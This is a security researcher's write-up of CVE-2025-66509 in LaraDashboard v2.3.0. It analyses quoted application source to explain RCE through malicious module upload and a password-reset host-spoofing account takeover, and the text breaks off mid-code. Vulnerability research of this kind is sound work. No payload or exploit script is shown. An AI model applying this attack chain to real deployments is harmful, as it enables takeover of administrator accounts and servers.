<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"><link rel="stylesheet" href="/assets/css/just-the-docs-head-nav.css" id="jtd-head-nav-stylesheet"><style id="jtd-nav-activation"> .site-nav > ul.nav-list:first-child > li > a, .site-nav > ul.nav-list:first-child > li > ul > li:not(:nth-child(2)) > a, .site-nav > ul.nav-list:first-child > li > ul > li > ul > li a { background-image: none; } .site-nav > ul.nav-list:not(:first-child) a, .site-nav li.external a { background-image: none; } .site-nav > ul.nav-list:first-child > li:nth-child(4) > ul > li:nth-child(2) > a { font-weight: 600; text-decoration: none; }.site-nav > ul.nav-list:first-child > li:nth-child(4) > button svg, .site-nav > ul.nav-list:first-child > li:nth-child(4) > ul > li:nth-child(2) > button svg { transform: rotate(-90deg); }.site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(4) > ul.nav-list, .site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(4) > ul.nav-list > li.nav-list-item:nth-child(2) > ul.nav-list { display: block; }</style><script src="/assets/js/vendor/lunr.min.js"></script> <script src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico" type="image/x-icon"><title>(1-Click) CVE-2025-66509 | EntryPoint Research</title><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="(1-Click) CVE-2025-66509" /><meta property="og:locale" content="en_US" /><meta name="description" content="Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces." /><meta property="og:description" content="Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces." /><link rel="canonical" href="http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-66509/" /><meta property="og:url" content="http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-66509/" /><meta property="og:site_name" content="EntryPoint Research" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(1-Click) CVE-2025-66509" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces.","headline":"(1-Click) CVE-2025-66509","url":"http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-66509/"}</script><body> <a class="skip-to-main" href="#main-content">Skip to main content</a> <svg xmlns="http://www.w3.org/2000/svg" class="d-none"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-external-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-external-link"><title id="svg-external-link-title">(external link)</title><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-copy" viewBox="0 0 16 16"><title>Copy</title><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/> </svg> </symbol> <symbol id="svg-copied" viewBox="0 0 16 16"><title>Copied</title><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard-check-fill" viewBox="0 0 16 16"><path d="M6.5 0A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3Zm3 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3Z"/><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1A2.5 2.5 0 0 1 9.5 5h-3A2.5 2.5 0 0 1 4 2.5v-1Zm6.854 7.354-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 0 1 .708-.708L7.5 10.793l2.646-2.647a.5.5 0 0 1 .708.708Z"/> </svg> </symbol> </svg><div class="side-bar"><div class="site-header" role="banner"> <a href="/" class="site-title lh-tight"> EntryPoint Research </a> <button id="menu-button" class="site-button btn-reset" aria-label="Toggle menu" aria-pressed="false"> <svg viewBox="0 0 24 24" class="icon" aria-hidden="true"><use xlink:href="#svg-menu"></use></svg> </button></div><nav aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item"><a href="/docs/Auth%20Bypass/" class="nav-list-link">Auth Bypass</a><li class="nav-list-item"><a href="/docs/SSRF%20(Server-Side%20Request%20Forgery)/" class="nav-list-link">SSRF</a><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in Pre-Auth RCE category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/docs/Pre-Auth-RCE/" class="nav-list-link">Pre-Auth RCE</a><ul class="nav-list"><li class="nav-list-item"><a href="/docs/Pre-Auth-RCE/CVE-2025-62713/" class="nav-list-link">(0-Click) CVE-2025-62713</a><li class="nav-list-item"><a href="/docs/Pre-Auth-RCE/CVE-2025-66509/" class="nav-list-link">(1-Click) CVE-2025-66509</a></ul></ul></nav><footer class="site-footer"> Let's build something awesome together.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search" role="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search EntryPoint Research" aria-label="Search EntryPoint Research" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div></div><div class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"><a href="/docs/Pre-Auth-RCE/">Pre-Auth RCE</a><li class="breadcrumb-nav-list-item"><span>(1-Click) CVE-2025-66509</span></ol></nav><div id="main-content" class="main-content"><main><h1 id="summary"> <a href="#summary" class="anchor-heading" aria-labelledby="summary"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Summary</h1><h2 id="what-is-laradashboard"> <a href="#what-is-laradashboard" class="anchor-heading" aria-labelledby="what-is-laradashboard"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> What is LaraDashboard</h2><p><img src="/assets/images/contents/CVE-2025-66509/1.png" alt="image.png" /></p><p>laradashboard is an “all-in-one” administrative panel and cms integration platform built on top of the laravel framework. the project provides a variety of essential features frequently required in web application development, including user management, role and permission control, configuration management, translation management, content management, and a modular extension system. these capabilities allow developers to utilize comprehensive administrative functions without any initial setup, and the platform incorporates modern components from the laravel ecosystem—such as tailwind css, livewire, and rest apis—which enables rapid service development</p><p>we discovered a 0-day vulnerability in the latest laradashboard release (v2.3.0) that leads to 1-click account takeover, which can be further escalated to remote code execution (rce).</p><h2 id="how-to-build-this-cms"> <a href="#how-to-build-this-cms" class="anchor-heading" aria-labelledby="how-to-build-this-cms"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> How to build this cms</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd laradashboard-main # assuming, you've extracted in laradashboard-main
composer install
npm install

Create .env file by copying .env.example file.

php artisan key:generate
php artisan storage:link

php artisan migrate:fresh --seed &amp;&amp; php artisan module:seed
composer run dev
</code></pre></div></div><p>We built the CMS using the following command, and our environment is shown below</p><p><img src="/assets/images/contents/CVE-2025-66509/2.png" alt="image.png" /></p><h2 id="router-architecture"> <a href="#router-architecture" class="anchor-heading" aria-labelledby="router-architecture"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Router architecture</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> pocas  ~/0-day/laradashboard-main/routes
❯ tree           
.
├── api.php
├── auth.php
├── channels.php
├── console.php
└── web.php

1 directory, 5 files
</code></pre></div></div><p>the routes are configured as shown above. most of the routes appear to be accessible only to authenticated users, while unauthenticated users can access only the login, registration, and password-reset functionalities.</p><h1 id="travel-to-trigger-an-rce"> <a href="#travel-to-trigger-an-rce" class="anchor-heading" aria-labelledby="travel-to-trigger-an-rce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Travel to trigger an RCE</h1><h2 id="what-is-module-in-laravel"> <a href="#what-is-module-in-laravel" class="anchor-heading" aria-labelledby="what-is-module-in-laravel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> What is module in Laravel</h2><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// Modules Routes.</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/modules'</span><span class="p">,</span> <span class="p">[</span><span class="nc">ModuleController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'index'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">name</span><span class="p">(</span><span class="s1">'modules.index'</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/modules/toggle-status/{module}'</span><span class="p">,</span> <span class="p">[</span><span class="nc">ModuleController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'toggleStatus'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">name</span><span class="p">(</span><span class="s1">'modules.toggle-status'</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/modules/upload'</span><span class="p">,</span> <span class="p">[</span><span class="nc">ModuleController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'store'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">name</span><span class="p">(</span><span class="s1">'modules.store'</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nb">delete</span><span class="p">(</span><span class="s1">'/modules/{module}'</span><span class="p">,</span> <span class="p">[</span><span class="nc">ModuleController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'destroy'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">name</span><span class="p">(</span><span class="s1">'modules.delete'</span><span class="p">);</span>

</code></pre></div></div><p>before understanding why this route exists, there is one important concept to note. laravel operates on an architecture where all application functionality is built upon a service provider–based dependency injection container (ioc container). internally, whenever a request is made, the framework initializes an application instance and loads only the list of service providers registered within it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌───────────────────────────────────────────────┐
│                 HTTP Request                  │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│      public/index.php (Front Controller)      │
│   - Creates the Application instance          │
│   - Creates the HTTP Kernel instance          │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│        Application Bootstrap Sequence         │
│   1) Load configuration files                 │
│   2) Load environment variables               │
│   3) Register core service providers          │
│   4) Register application service providers   │
│      → from config/app.php 'providers' array  │
│      → from package auto-discovery (composer) │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│     ServiceProvider::register() Execution     │
│   - Binds classes into the IoC container      │
│   - Registers singletons / dependencies       │
│   - Merges configuration (mergeConfigFrom)    │
│   * Executed on every request                 │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│       ServiceProvider::boot() Execution       │
│   - Loads routes (loadRoutesFrom)             │
│   - Registers event listeners                 │
│   - Publishes resources                       │
│   - Any bootstrapping logic for the module    │
│   * Also executed on every request            │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│               Middleware Stack                │
│   - Global middleware                         │
│   - Route middleware groups                   │
│   - Route-specific middleware                 │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│                Route Resolution               │
│   - Matches the incoming request to a route   │
│   - Executes the controller/action/closure    │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌───────────────────────────────────────────────┐
│                 Response Sent                 │
│   - Response returned to the browser          │
└───────────────────────────────────────────────┘

</code></pre></div></div><p>when a request is received, laravel first bootstraps the http kernel, then executes the register() methods of all registered service providers once to configure the ioc container bindings. during specific stages of the request lifecycle, laravel subsequently invokes each provider’s boot() method to perform additional tasks such as route loading, event listener binding, and configuration merging.</p><p>therefore, the route shown above is intended for managing these modules, allowing administrators to upload new modules. even after a module is uploaded, it is not immediately registered; the administrator must explicitly activate it using the enable button. once enabled, the module is automatically registered and executed on every incoming request.</p><h2 id="uploadmodule-logic"> <a href="#uploadmodule-logic" class="anchor-heading" aria-labelledby="uploadmodule-logic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> uploadModule logic</h2><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">store</span><span class="p">(</span><span class="kt">StoreModuleRequest</span> <span class="nv">$request</span><span class="p">):</span> <span class="kt">RedirectResponse</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">authorize</span><span class="p">(</span><span class="s1">'create'</span><span class="p">,</span> <span class="nc">Module</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="nf">config</span><span class="p">(</span><span class="s1">'app.demo_mode'</span><span class="p">,</span> <span class="kc">false</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">session</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">flash</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nf">__</span><span class="p">(</span><span class="s1">'Module upload is restricted in demo mode. Please try on your local/live environment.'</span><span class="p">));</span>

            <span class="k">return</span> <span class="nf">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">route</span><span class="p">(</span><span class="s1">'admin.modules.index'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">moduleService</span><span class="o">-&gt;</span><span class="nf">uploadModule</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>

            <span class="nf">session</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">flash</span><span class="p">(</span><span class="s1">'success'</span><span class="p">,</span> <span class="nf">__</span><span class="p">(</span><span class="s1">'Module uploaded successfully.'</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">\Throwable</span> <span class="nv">$th</span><span class="p">)</span> <span class="p">{</span>
            <span class="nf">session</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">flash</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nv">$th</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">());</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nf">redirect</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">route</span><span class="p">(</span><span class="s1">'admin.modules.index'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div><p>the store() method is invoked when an administrator uploads a module. inside this method, it can be seen that the uploadModule() method is called to handle the upload process.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">uploadModule</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="nb">file</span><span class="p">(</span><span class="s1">'module'</span><span class="p">);</span>
        <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nf">storeAs</span><span class="p">(</span><span class="s1">'modules'</span><span class="p">,</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nf">getClientOriginalName</span><span class="p">());</span>

        <span class="c1">// Extract and install the module.</span>
        <span class="nv">$modulePath</span> <span class="o">=</span> <span class="nf">storage_path</span><span class="p">(</span><span class="s1">'app/'</span> <span class="mf">.</span> <span class="nv">$filePath</span><span class="p">);</span>
        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\ZipArchive</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">open</span><span class="p">(</span><span class="nv">$modulePath</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">ModuleException</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'Module upload failed. The file may not be a valid zip archive.'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="nv">$moduleName</span> <span class="o">=</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">getNameIndex</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// Retrieve the module folder name before closing</span>
        <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">extractTo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">modulesPath</span><span class="p">);</span>
        <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>

        <span class="c1">// Check valid module structure.</span>
        <span class="nv">$moduleName</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$moduleName</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nc">File</span><span class="o">::</span><span class="nf">exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">modulesPath</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$moduleName</span> <span class="mf">.</span> <span class="s1">'/module.json'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">ModuleException</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'Failed to find the module in the system. Please ensure the module has a valid module.json file.'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1">// Save this module to the modules_statuses.json file.</span>
        <span class="nv">$moduleStatuses</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getModuleStatuses</span><span class="p">();</span>
        <span class="nv">$moduleStatuses</span><span class="p">[</span><span class="nv">$moduleName</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="nc">File</span><span class="o">::</span><span class="nf">put</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">modulesStatusesPath</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$moduleStatuses</span><span class="p">,</span> <span class="no">JSON_PRETTY_PRINT</span><span class="p">));</span>

        <span class="c1">// Clear the cache.</span>
        <span class="nc">Artisan</span><span class="o">::</span><span class="nf">call</span><span class="p">(</span><span class="s1">'cache:clear'</span><span class="p">);</span> 

        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div><p>the uploadModule() method is responsible for extracting the provided zip file and placing its contents under the modules/ directory.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">toggleModule</span><span class="p">(</span><span class="nv">$moduleName</span><span class="p">,</span> <span class="nv">$enable</span> <span class="o">=</span> <span class="kc">true</span><span class="p">):</span> <span class="kt">bool</span>
    <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// Clear the cache.</span>
            <span class="nc">Artisan</span><span class="o">::</span><span class="nf">call</span><span class="p">(</span><span class="s1">'cache:clear'</span><span class="p">);</span>

            <span class="c1">// Activate/Deactivate the module.</span>
            <span class="nv">$callbackName</span> <span class="o">=</span> <span class="nv">$enable</span> <span class="o">?</span> <span class="s1">'module:enable'</span> <span class="o">:</span> <span class="s1">'module:disable'</span><span class="p">;</span>
            <span class="nc">Artisan</span><span class="o">::</span><span class="nf">call</span><span class="p">(</span><span class="nv">$callbackName</span><span class="p">,</span> <span class="p">[</span><span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$moduleName</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">\Throwable</span> <span class="nv">$th</span><span class="p">)</span> <span class="p">{</span>
            <span class="nc">Log</span><span class="o">::</span><span class="nf">error</span><span class="p">(</span><span class="s2">"Failed to toggle module </span><span class="si">{</span><span class="nv">$moduleName</span><span class="si">}</span><span class="s2">: "</span> <span class="mf">.</span> <span class="nv">$th</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">());</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">ModuleException</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'Failed to toggle module status. Please check the logs for more details.'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div><p>the toggleModule() method is invoked when an administrator enables or disables an uploaded module. internally, it executes the module:enable or module:disable commands via the artisan::call() method, which results in the corresponding service provider being registered or deregistered.</p><p>in other words, a user with administrative privileges can upload arbitrary modules, and by doing so, can insert malicious php code and trigger remote code execution (rce). however, this functionality cannot be exploited without access to an administrator account, meaning that an authentication bypass or account takeover vulnerability is required to abuse it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> pocas  ~/0-day/laradashboard-main
❯ cat modules_statuses.json
{
    "Crm": true,
    "TaskManager": true,
    "Site": true
}%  
</code></pre></div></div><p>however, this behavior is not an issue here. the modules that are enabled by default can be confirmed in the modules_statuses.json file, which includes crm, taskmanager, and site. if a module is uploaded using one of these names, it will be executed immediately without requiring manual activation.</p><h1 id="escalation-to-pre-auth"> <a href="#escalation-to-pre-auth" class="anchor-heading" aria-labelledby="escalation-to-pre-auth"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Escalation to Pre-Auth</h1><h2 id="auth-bypass-via-screenshot-login-failed"> <a href="#auth-bypass-via-screenshot-login-failed" class="anchor-heading" aria-labelledby="auth-bypass-via-screenshot-login-failed"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Auth bypass via screenshot-login (Failed)</h2><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/screenshot-login/{email}'</span><span class="p">,</span> <span class="p">[</span><span class="nc">ScreenshotGeneratorLoginController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'login'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="s1">'web'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">name</span><span class="p">(</span><span class="s1">'screenshot.login'</span><span class="p">);</span>
</code></pre></div></div><p>among the many routes, we found a route named /screenshot-login/{email}. although it is related to login, it appeared to function differently from a typical authentication endpoint, which prompted us to begin reviewing the code.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">ScreenshotGeneratorLoginController</span> <span class="kd">extends</span> <span class="nc">Controller</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">login</span><span class="p">(</span><span class="nv">$email</span><span class="p">):</span> <span class="kt">RedirectResponse</span>
    <span class="p">{</span>
        <span class="c1">// Only allow this functionality in non-production environments</span>
        <span class="k">if</span> <span class="p">(</span><span class="nc">App</span><span class="o">::</span><span class="nf">environment</span><span class="p">(</span><span class="s1">'production'</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s1">'This functionality is not available in production environment'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Find the user by email.</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nc">User</span><span class="o">::</span><span class="nf">where</span><span class="p">(</span><span class="s1">'email'</span><span class="p">,</span> <span class="nv">$email</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">firstOrFail</span><span class="p">();</span>

        <span class="c1">// Authenticate the user and redirect.</span>
        <span class="nc">Auth</span><span class="o">::</span><span class="nf">login</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">target</span> <span class="o">?</span> <span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">target</span> <span class="o">:</span> <span class="s1">'/admin'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div><p>yes, this endpoint can be used to bypass authentication, as it allows a user to log in directly using only an email address. however, this behavior is only valid in development mode and is not enabled in production, making it ineffective as an attack vector in real-world deployments.</p><h2 id="1-click-account-takeover-via-host-spoofing-goooood"> <a href="#1-click-account-takeover-via-host-spoofing-goooood" class="anchor-heading" aria-labelledby="1-click-account-takeover-via-host-spoofing-goooood"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 1-Click Account Takeover via host spoofing (Goooood)</h2><h3 id="logic-for-sending-the-password-reset-token"> <a href="#logic-for-sending-the-password-reset-token" class="anchor-heading" aria-labelledby="logic-for-sending-the-password-reset-token"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Logic for sending the password reset token</h3><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">sendPasswordResetNotification</span><span class="p">(</span><span class="nv">$token</span><span class="p">):</span> <span class="kt">void</span>
    <span class="p">{</span>
        <span class="c1">// Check if the request is for the admin panel</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">is</span><span class="p">(</span><span class="s1">'admin/*'</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">notify</span><span class="p">(</span><span class="k">new</span> <span class="nc">AdminResetPasswordNotification</span><span class="p">(</span><span class="nv">$token</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">notify</span><span class="p">(</span><span class="k">new</span> <span class="nc">DefaultResetPassword</span><span class="p">(</span><span class="nv">$token</span><span class="p">));</span>
